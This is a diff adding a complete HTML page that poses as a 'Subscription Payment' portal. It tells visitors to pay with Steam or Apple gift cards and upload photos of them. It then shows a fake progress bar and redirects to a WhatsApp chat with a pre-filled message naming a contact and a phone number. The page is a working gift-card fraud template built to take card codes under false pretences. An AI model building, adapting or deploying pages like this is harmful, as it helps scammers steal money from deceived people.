@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Subscription Payment</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      min-height: 100vh;
+      background: linear-gradient(
+          rgba(10, 10, 10, 0.7),
+          rgba(20, 20, 20, 0.85)
+        ),
+        url('https://images.unsplash.com/photo-1512389142860-9c449e58a543?auto=format&fit=crop&w=1600&q=80');
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+    }
+
+    .box {
+      background: rgba(0, 0, 0, 0.65);
+      padding: 30px 26px;
+      border-radius: 18px;
+      max-width: 430px;
+      width: 100%;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      line-height: 1.6;
+      opacity: 0.95;
+    }
+
+    .method {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(255,255,255,0.08);
+      padding: 14px;
+      border-radius: 12px;
+      margin-top: 14px;
+      text-align: left;
+    }
+
+    .method img {
+      width: 44px;
+      height: 44px;
+    }
+
+    .steam strong { color: #25d366; }
+    .apple strong { color: #ffcc00; }
+
+    .upload-box {
+      margin-top: 22px;
+      padding: 16px;
+      border: 2px dashed rgba(255,255,255,0.35);
+      border-radius: 14px;
+    }
+
+    input[type="file"] {
+      margin-top: 10px;
+      width: 100%;
+      color: #fff;
+    }
+
+    .button {
+      margin-top: 20px;
+      padding: 14px 26px;
+      background: linear-gradient(135deg, #25d366, #128c7e);
+      color: #fff;
+      font-weight: bold;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 8px 22px rgba(0,0,0,0.45);
+    }
+
+    /* PROGRESS BAR */
+    .progress-container {
+      margin-top: 20px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 20px;
+      overflow: hidden;
+      height: 18px;
+      display: none;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #25d366, #ffd700);
+      transition: width 0.4s ease;
+    }
+
+    .status {
+      margin-top: 16px;
+      font-size: 14px;
+      color: #ffd700;
+      font-weight: bold;
+      display: none;
+    }
+
+    .footer {
+      margin-top: 22px;
+      font-size: 12px;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="box">
+    <h1>Subscription Payment</h1>
+
+    <p>
+      Choose your preferred gift card method below.  
+      <strong>Steam Gift Cards are processed at a higher rate</strong>
+      during subscription activation.
+    </p>
+
+    <div class="method steam">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam">
+      <div>
+        <strong>Steam Gift Card</strong><br>
+        €100 Steam Card = <strong>Higher Processing Rate</strong><br>
+        Faster confirmation & priority access
+      </div>
+    </div>
+
+    <div class="method apple">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+      <div>
+        <strong>Apple Gift Card</strong><br>
+        €100 Apple Card = <strong>60% Processing Rate</strong><br>
+        Slower verification during subscription
+      </div>
+    </div>
+
+    <div class="upload-box">
+      <p><strong>Upload Gift Card Images</strong></p>
+      <input type="file" id="files" accept="image/*" multiple>
+    </div>
+
+    <button class="button" onclick="startProcess()">UPLOAD</button>
+
+    <!-- PROGRESS BAR -->
+    <div class="progress-container" id="progressBox">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="status" id="statusText">
+      ⏳ PROCESSING…<br><br>
+      <strong>Your subscription will be completed within 48 HOURS.</strong>
+    </div>
+
+    <div class="footer">
+      Secure Subscription Verification
+    </div>
+  </div>
+
+  <script>
+  function startProcess() {
+    const files = document.getElementById("files").files;
+    if (files.length === 0) {
+      alert("Please upload at least one card image.");
+      return;
+    }
+
+    const progressBox = document.getElementById("progressBox");
+    const bar = document.getElementById("progressBar");
+    const status = document.getElementById("statusText");
+
+    progressBox.style.display = "block";
+    status.style.display = "block";
+
+    let progress = 0;
+
+    const interval = setInterval(() => {
+      progress += Math.floor(Math.random() * 8) + 5;
+
+      if (progress >= 100) {
+        progress = 100;
+        bar.style.width = "100%";
+        clearInterval(interval);
+
+        // PRE-FILLED WHATSAPP MESSAGE
+        const message = encodeURIComponent(
+          "Hello Ewout Key 👋\n\nI have completed my subscription upload.\n" +
+          "Payment method: Apple Gift Card\n" +
+          "Images uploaded successfully and will be uploaded here shortly.\n\n" +
+          "Please proceed with verification. Thank you."
+        );
+
+        // AUTO REDIRECT AFTER 2 SECONDS
+        setTimeout(() => {
+          window.location.href = "https://wa.me/4915219466879?text=" + message;
+        }, 3000);
+
+      } else {
+        bar.style.width = progress + "%";
+      }
+    }, 400);
+  }
+</script>
+</body>
+</html>
